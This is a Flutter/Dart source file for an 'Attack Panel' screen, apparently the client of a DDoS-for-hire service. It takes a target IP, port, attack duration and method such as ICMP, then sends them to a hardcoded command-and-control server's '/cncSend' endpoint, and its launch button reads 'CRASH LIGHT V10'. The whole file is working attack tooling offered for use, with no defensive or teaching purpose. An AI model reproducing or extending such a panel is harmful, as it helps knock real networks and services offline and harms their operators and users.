import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "http://nodeyanzzoffc-private.rxpedia.my.id:25597";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("❌ Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("❌ Invalid Port", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      print(data);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Invalid Key", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Failed", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("✅ Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("❌ Error", "An unexpected error occurred. Please try again.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black87,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Text(title, style: const TextStyle(color: Colors.purpleAccent, fontFamily: 'Orbitron')),
        content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: Colors.purpleAccent)),
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        elevation: 0,
        title: const Text(
          "🚀 Attack Panel",
          style: TextStyle(
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            color: Colors.purpleAccent,
          ),
        ),
        centerTitle: true,
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            children: [
              FadeTransition(
                opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                child: ClipOval(
                  child: Image.asset(
                    'assets/images/logo.jpg',
                    width: 120,
                    height: 120,
                    fit: BoxFit.cover,
                  ),
                ),
              ),
              const SizedBox(height: 20),
              const Text(
                "Target Input & Methods",
                style: TextStyle(
                  color: Colors.purpleAccent,
                  fontFamily: 'Orbitron',
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const Divider(color: Colors.purpleAccent, thickness: 0.6),
              const SizedBox(height: 25),

              // === Target Input Card ===
              _buildInputCard(
                icon: Icons.computer,
                title: "Target IP",
                child: TextField(
                  controller: targetController,
                  style: const TextStyle(color: Colors.white),
                  cursorColor: Colors.purple,
                  decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
                ),
              ),
              const SizedBox(height: 20),

              // === Port Input Card ===
              _buildInputCard(
                icon: Icons.wifi_tethering,
                title: "Port",
                child: TextField(
                  controller: portController,
                  enabled: !isIcmp,
                  keyboardType: TextInputType.number,
                  style: TextStyle(color: isIcmp ? Colors.grey : Colors.white),
                  decoration: _inputStyle(
                    isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
                    isIcmp: isIcmp,
                  ),
                ),
              ),
              const SizedBox(height: 20),

              // === Duration Slider ===
              _buildInputCard(
                icon: Icons.timer,
                title: "Attack Duration",
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text("⏱ ${attackDuration.toInt()} seconds",
                        style: const TextStyle(color: Colors.white70, fontSize: 14)),
                    Slider(
                      value: attackDuration,
                      min: 10,
                      max: 300,
                      divisions: 29,
                      label: "${attackDuration.toInt()}s",
                      activeColor: Colors.purpleAccent,
                      inactiveColor: Colors.white12,
                      onChanged: (value) {
                        setState(() => attackDuration = value);
                      },
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),

              // === Dropdown Attack Methods ===
              _buildInputCard(
                icon: Icons.flash_on,
                title: "Attack Method",
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<String>(
                    dropdownColor: Colors.black,
                    value: selectedDoosId,
                    isExpanded: true,
                    iconEnabledColor: Colors.purpleAccent,
                    style: const TextStyle(color: Colors.white),
                    items: widget.listDoos.map((doos) {
                      return DropdownMenuItem<String>(
                        value: doos['ddos_id'],
                        child: Text(
                          doos['ddos_name'],
                          style: const TextStyle(color: Colors.purpleAccent),
                        ),
                      );
                    }).toList(),
                    onChanged: (value) {
                      setState(() {
                        selectedDoosId = value!;
                      });
                    },
                  ),
                ),
              ),
              const SizedBox(height: 40),

              // === Send Button ===
              SizedBox(
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: _sendDoos,
                  icon: const Icon(Icons.bolt, color: Colors.white),
                  label: const Text(
                    "CRASH LIGHT V10",
                    style: TextStyle(
                      fontSize: 16,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.2,
                      color: Colors.white,
                    ),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.deepPurple,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                    elevation: 6,
                    shadowColor: Colors.purpleAccent.withOpacity(0.6),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.black45,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.purpleAccent, width: 1),
        boxShadow: [
          BoxShadow(
            color: Colors.purpleAccent.withOpacity(0.3),
            blurRadius: 8,
            spreadRadius: 1,
          )
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon, color: Colors.purpleAccent, size: 20),
              const SizedBox(width: 8),
              Text(title,
                  style: const TextStyle(color: Colors.purpleAccent, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 10),
          child,
        ],
      ),
    );
  }

  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(color: isIcmp ? Colors.grey : Colors.redAccent),
      filled: true,
      fillColor: Colors.black54,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : Colors.purpleAccent),
        borderRadius: BorderRadius.circular(16),
      ),
      focusedBorder: OutlineInputBorder(
        borderSide: BorderSide(color: isIcmp ? Colors.grey : Colors.white),
        borderRadius: BorderRadius.circular(16),
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}
